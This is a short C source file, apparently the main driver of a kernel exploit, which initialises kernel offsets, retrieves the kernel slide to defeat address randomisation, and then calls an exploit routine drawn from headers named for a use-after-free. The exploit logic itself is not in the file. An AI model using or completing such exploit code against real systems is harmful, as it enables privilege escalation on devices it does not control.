#include <plog.h>
#include <common.h>
#include <kslide.h>
#include <offsets.h>
#include <uaf.h>
#include <exploit.h>

int main(void)
{
    
    if(!offsets_initialize())
    {
        ERR("offsets_initialize() failed");
        return -1;
    }
    
    addr_t slide = get_kernel_slide();
    if(!slide)
    {
        ERR("get_kernel_slide() failed");
        return -1;
    }
    
    exploit();
    
    return 0;
}
